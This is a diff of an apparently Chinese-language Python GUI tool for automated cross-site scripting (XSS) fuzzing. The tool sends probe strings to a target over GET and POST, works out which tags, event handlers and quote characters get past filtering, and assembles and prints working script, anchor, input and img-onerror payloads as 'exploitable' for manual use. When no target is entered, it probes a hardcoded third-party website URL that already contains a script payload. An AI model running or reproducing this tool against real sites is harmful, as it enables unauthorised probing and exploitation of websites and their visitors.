@@ -7,7 +7,7 @@ import urllib.parse
 from PyQt5.QtWidgets import QApplication, QMainWindow
 
 from modules import format, lists
-from modules.precheck import CheckPrepare
+from modules.precheck import PreCheck
 from ui.start import Ui_MainWindow
 from PyQt5 import QtCore, QtGui
 from PyQt5.QtCore import *
@@ -65,18 +65,20 @@ class Worker(QThread):
         #         #     print("请输出注入参数...")
         #         #     return
         print("---------开始进行测试---------".center(170), "\n")
+        urldata.urldata_init()
         payload.keyword_init()
         format.allclear()  # 输入2
         urldata.word = myWin.input_arg.text().strip()
         urldata.targeturl = myWin.input_url.text()
         if urldata.targeturl== "":
+            print("未检测到输入，使用内置链接进行测试")
             urldata.targeturl = "http://m.cndits.com/product/visa/lists/zone_id/930400?var=<ScRipt>zhhkxa(6012);</ScRipt>"
         print("检测目标".center(170), "\n", urldata.targeturl)
         format.breakline()
-        begin = CheckPrepare()
-        begin.rebuild()
-        begin.isurlok()
-        if urldata.urlok== "no":
+        begin = PreCheck()
+        begin.rebuildurl()
+        begin.checkurlaccessible()
+        if urldata.urlsuccess== "no":
             return
         begin2 = CheckStart()
         begin2.check_close()
@@ -107,7 +109,7 @@ class CheckStart():
                     re.escape(
                         urllib.parse.unquote(
                             urllib.parse.unquote(pd))),
-                        CheckPrepare.get_response(
+                        PreCheck.get_response(
                             self,
                             re.sub(
                         re.escape("abcdef1234"),
@@ -133,7 +135,7 @@ class CheckStart():
                             re.escape(
                                 urllib.parse.unquote(
                                     urllib.parse.unquote(i))),
-                            CheckPrepare.get_response(
+                            PreCheck.get_response(
                                 self,
                                 re.sub(
                                     re.escape("abcdef1234"),
@@ -177,7 +179,7 @@ class CheckStart():
                     re.escape(
                         urllib.parse.unquote(
                             urllib.parse.unquote(pd))),
-                        CheckPrepare.post_response(
+                        PreCheck.post_response(
                             self,
                             re.sub(
                         re.escape("abcdef1234"),
@@ -202,7 +204,7 @@ class CheckStart():
                             re.escape(
                                 urllib.parse.unquote(
                                     urllib.parse.unquote(i))),
-                            CheckPrepare.post_response(
+                            PreCheck.post_response(
                                 self,
                                 re.sub(
                                     re.escape("abcdef1234"),
@@ -253,7 +255,7 @@ class CheckStart():
             def get_start(pd):
 
                 # replace("\\\\\\\\","\\\\") 是因为 unicode 编码之后，再使用urllib.parse.unquote（）会变成 8 个\，这时候正则匹配的是 4 个\，实际只需匹配 2 个\，所以要做个replace
-                if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(pd))).replace("\\\\\\\\","\\\\"), CheckPrepare.get_response(self, re.sub(re.escape("abcdef1234"), pd, urldata.get_url))):
+                if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(pd))).replace("\\\\\\\\","\\\\"), PreCheck.get_response(self, re.sub(re.escape("abcdef1234"), pd, urldata.get_url))):
                     urldata.unsensitive['action'].append(pd)
                 else:
                     urldata.sensitive['action'].append(pd)
@@ -293,7 +295,7 @@ class CheckStart():
                     re.escape(
                         urllib.parse.unquote(
                             urllib.parse.unquote(i))).replace("\\\\\\\\","\\\\"),
-                        CheckPrepare.post_response(
+                        PreCheck.post_response(
                             self,
                             re.sub(
                         re.escape("abcdef1234"),
@@ -337,7 +339,7 @@ class CheckStart():
                     re.escape(
                         urllib.parse.unquote(
                             urllib.parse.unquote(pd))),
-                        CheckPrepare.get_response(
+                        PreCheck.get_response(
                             self,
                             re.sub(
                         re.escape("abcdef1234"),
@@ -365,7 +367,7 @@ class CheckStart():
                     re.escape(
                         urllib.parse.unquote(
                             urllib.parse.unquote(i))),
-                        CheckPrepare.post_response(
+                        PreCheck.post_response(
                             self,
                             re.sub(
                         re.escape("abcdef1234"),
@@ -419,7 +421,7 @@ class CheckStart():
                     re.escape(
                         urllib.parse.unquote(
                             urllib.parse.unquote(pd))),
-                        CheckPrepare.get_response(
+                        PreCheck.get_response(
                             self,
                             re.sub(
                         re.escape("abcdef1234"),
@@ -452,7 +454,7 @@ class CheckStart():
                     re.escape(
                         urllib.parse.unquote(
                             urllib.parse.unquote(i))),
-                        CheckPrepare.post_response(
+                        PreCheck.post_response(
                             self,
                             re.sub(
                         re.escape("abcdef1234"),
@@ -497,19 +499,14 @@ class CheckStart():
 
         iiss = 1
         for e1 in urldata.unsensitive['action']:
-            while iiss > 10:
-                break
-            else:
-                for e2 in urldata.unsensitive['onevent']:
-                    # print(str591+"%20"+e2.replace("591", "") + e1+"%20")
-                    payload.keyword['combination_close_no'].append(str591 + "%20" + e2.replace("591", "") + e1 + "%20")
+            for e2 in urldata.unsensitive['onevent']:
+                if iiss < 11 :
+                    payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"nsf="+str591)
                     iiss += 1
-                    while iiss > 10:
-                        break  # return 会跳出整个函数,break 跳出单层循环
 
-        print("payload.keyword['combination_close_no']:")
-        for erer in payload.keyword['combination_close_no']:
-            print(erer)
+        # print("payload.keyword['combination_close_no']:")
+        # for erer in payload.keyword['combination_close_no']:
+        #     print(erer)
 
 
 
@@ -530,14 +527,8 @@ class CheckStart():
                 if re.search(
                     re.escape(
                         urllib.parse.unquote(
-                            urllib.parse.unquote(pd))),
-                        CheckPrepare.get_response(
-                            self,
-                            re.sub(
-                        re.escape("abcdef1234"),
-                        pd,
-                                urldata.get_url))):  # 使用 re.escape()
-
+                            urllib.parse.unquote(pd))).replace(" ", ".*").replace("\\\\\\\\","\\\\").replace("\\.*", ".*"),
+                        PreCheck.get_response(self, re.sub(re.escape("abcdef1234"), pd, urldata.get_url))):  # 使用 re.escape()
                     urldata.unsensitive['combination_close_no'].append(pd)
                 else:
                     urldata.sensitive['combination_close_no'].append(pd)
@@ -546,9 +537,9 @@ class CheckStart():
                 mythread = threading.Thread(target=get_start(i))
                 mythread.start()
 
-            print("组合测试完成，输出组合 payload 结果：")
+            print("\n"+"组合测试完成，输出组合 payload 结果：")
 
-            [print("可利用 payload(请手工测试)：", re.sub(re.escape("abcdef1234"), e, urldata.get_url))
+            [print("\n"+"可利用 payload(请手工测试)：", re.sub(re.escape("abcdef1234"), e, urldata.get_url))
              for e in urldata.unsensitive['combination_close_no']]
 
             break
@@ -562,13 +553,13 @@ class CheckStart():
                 if re.search(
                     re.escape(
                         urllib.parse.unquote(
-                            urllib.parse.unquote(pd))),
-                        CheckPrepare.post_response(
+                            urllib.parse.unquote(pd))).replace(" ", ".*").replace("\\\\\\\\","\\\\").replace("\\.*", ".*"),
+                        PreCheck.post_response(
                             self,
                             re.sub(
                         re.escape("abcdef1234"),
                         pd,
-                                urldata.get_url))):  # 使用 re.escape()
+                                urldata.post_data))):  # 使用 re.escape()
 
                     urldata.unsensitive['combination_close_no'].append(pd)
                 else:
@@ -578,9 +569,9 @@ class CheckStart():
                 mythread = threading.Thread(target=post_start(i))
                 mythread.start()
 
-            print("组合测试完成，输出组合 payload 结果：")
+            print("\n"+"组合测试完成，输出组合 payload 结果：")
 
-            [print("可利用 payload(请手工测试)：", "(POST)", re.sub(re.escape("abcdef1234"), e, urldata.post_data))
+            [print("\n"+"可利用 payload(请手工测试)：", "(POST)", re.sub(re.escape("abcdef1234"), e, urldata.post_data))
              for e in urldata.unsensitive['combination_close_no']]
 
             break
@@ -646,30 +637,29 @@ class CheckStart():
 
             ### 构造 payload
 
-
-            str591 = ""
+            str592 = ""
             for e in urldata.unsensitive['close']:
                 if e == "%22591" or e == "%27591" or e == "\"591" or e == "\'591":
-                    str591 += e.replace("591", "")
+                    str592 += e.replace("591", "")
 
             iiss = 1
             for e1 in urldata.unsensitive['tag']:
                 if re.search(re.escape("script"), e1, re.IGNORECASE):
                     payload.keyword['combination_close_yes'].append(
-                        "<ScRipt>"+urldata.unsensitive['action'][0]+"</ScRipt>" )
+                        str592+"<ScRipt>"+urldata.unsensitive['action'][0]+"</ScRipt>" )
 
                 if re.search(re.escape("<a>"), e1, re.IGNORECASE):
                     payload.keyword['combination_close_yes'].append(
-                        "<A"+" "+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">"+"591</A>" )
+                        str592+"<A"+" "+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">"+"591</A>" )
 
                 if re.search(re.escape("input"), e1, re.IGNORECASE):
                     payload.keyword['combination_close_yes'].append(
-                        "<iNpUt"+" "+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">"+"591</iNpUt>" )
+                        str592+"<iNpUt"+" "+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">"+"591</iNpUt>" )
 
                 if re.search(re.escape("img"), e1, re.IGNORECASE):
                     # if "src" in urldata.unsensitive['onevent'] and "onerror" in urldata.unsensitive['onevent']: # 用 in 匹配时注意大小写必须一致，这很烦，所以不用 in，用 re 匹配
                     if re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
-                        payload.keyword['combination_close_yes'].append("<ImG"+" "+"scr=x"+" "+"OnErrOr="+urldata.unsensitive['action'][0])
+                        payload.keyword['combination_close_yes'].append(str592+"<ImG"+" "+"scr=x"+" "+"OnErrOr="+urldata.unsensitive['action'][0])
                         # if re.search(re.escape("eval"), "".join(urldata.unsensitive['action']), re.IGNORECASE) :
                         #     payload.keyword['combination_close_yes'].append("<ImG"+" "+"scr=x"+" "+"OnErrOr="+''.join((r'\x%2x'%ord(c)for c in 'alert(591)')))
 
@@ -693,8 +683,8 @@ class CheckStart():
                     if re.search(
                             re.escape(
                                 urllib.parse.unquote(
-                                    urllib.parse.unquote(pd))),
-                            CheckPrepare.get_response(
+                                    urllib.parse.unquote(pd))).replace(" ", "%20").replace("\\\\\\\\","\\\\").replace("\\.*", ".*"),
+                            PreCheck.get_response(
                                 self,
                                 re.sub(
                                     re.escape("abcdef1234"),
@@ -709,9 +699,9 @@ class CheckStart():
                     mythread = threading.Thread(target=get_start(i))
                     mythread.start()
 
-                print("组合测试完成，输出组合 payload 结果：")
+                print("\n"+"组合测试完成，输出组合 payload 结果：")
 
-                [print("可利用 payload(请手工测试)：", re.sub(re.escape("abcdef1234"), e, urldata.get_url))
+                [print("\n"+"可利用 payload(请手工测试)：", re.sub(re.escape("abcdef1234"), e, urldata.get_url))
                  for e in urldata.unsensitive['combination_close_yes']]
 
                 break
@@ -723,8 +713,8 @@ class CheckStart():
                     if re.search(
                             re.escape(
                                 urllib.parse.unquote(
-                                    urllib.parse.unquote(pd))),
-                            CheckPrepare.post_response(
+                                    urllib.parse.unquote(pd))).replace(" ", "%20").replace("\\\\\\\\","\\\\").replace("\\.*", ".*"),
+                            PreCheck.post_response(
                                 self,
                                 re.sub(
                                     re.escape("abcdef1234"),
@@ -739,9 +729,9 @@ class CheckStart():
                     mythread = threading.Thread(target=post_start(i))
                     mythread.start()
 
-                print("组合测试完成，输出组合 payload 结果：")
+                print("\n"+"组合测试完成，输出组合 payload 结果：")
 
-                [print("可利用 payload(请手工测试)：", "(POST)", re.sub(re.escape("abcdef1234"), e, urldata.post_data))
+                [print("\n"+"可利用 payload(请手工测试)：", "(POST)", re.sub(re.escape("abcdef1234"), e, urldata.post_data))
                  for e in urldata.unsensitive['combination_close_yes']]
 
                 break
@@ -840,7 +830,7 @@ class CheckStart():
                         re.escape(
                             urllib.parse.unquote(
                                 urllib.parse.unquote(pd))),
-                        CheckPrepare.get_response(
+                        PreCheck.get_response(
                             self,
                             re.sub(
                                 re.escape("abcdef1234"),
@@ -870,7 +860,7 @@ class CheckStart():
                         re.escape(
                             urllib.parse.unquote(
                                 urllib.parse.unquote(i))),
-                        CheckPrepare.post_response(
+                        PreCheck.post_response(
                             self,
                             re.sub(
                                 re.escape("abcdef1234"),
